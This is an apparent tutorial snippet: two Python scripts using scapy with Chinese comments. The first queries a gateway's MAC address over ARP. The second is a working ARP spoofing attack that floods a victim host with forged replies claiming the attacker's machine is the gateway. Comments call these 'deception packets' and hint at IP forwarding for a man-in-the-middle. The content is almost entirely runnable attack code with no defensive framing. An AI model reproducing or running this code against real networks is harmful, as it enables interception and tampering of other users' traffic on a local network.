```python
from scapy.all import *

# 发送arp请求，问谁是192.168.123.1,他的mac地址是多少
arp_request = ARP(op=1, pdst='192.168.123.1')
print(arp_request.show())
print('=='*30)

# 收应答
arp_response = sr1(arp_request, iface='en0')
print(arp_response.show())
```

```python
import time
# 开始欺骗对方，给对方一个arp应答，告诉对方我是网关
# 方法是: 用arp告诉对方我的ip就是网关的ip
#     我的mac地址: hwsrc='8:31:c1:b8:75:76'
#     我的ip地址(写成网关的，进行欺骗):  psrc='192.168.123.1'
#     目标的mac地址:  hwdst=''
#     目标的ip地址:   pdst=''
# ARP是3层协议
arp_request = ARP(op=2,hwsrc='78:31:c1:b8:75:76', psrc='192.168.123.1', hwdst='5a:68:8c:8d:3f:84', pdst='192.168.123.49')
# 2层协议，链路层
eth_request = Ether(src='78:31:c1:b8:75:76', dst='5a:68:8c:8d:3f:84')

# 拼接，语法: 2层 / 3层 / 4层 / ...
request = eth_request / arp_request

while True:
    time.sleep(0.01)
    # 发送欺诈包
    sendp(request, iface='en0')
print('欺诈完成!')

# 查看内核信息 sysctl -a | grep ip.forwarding
```
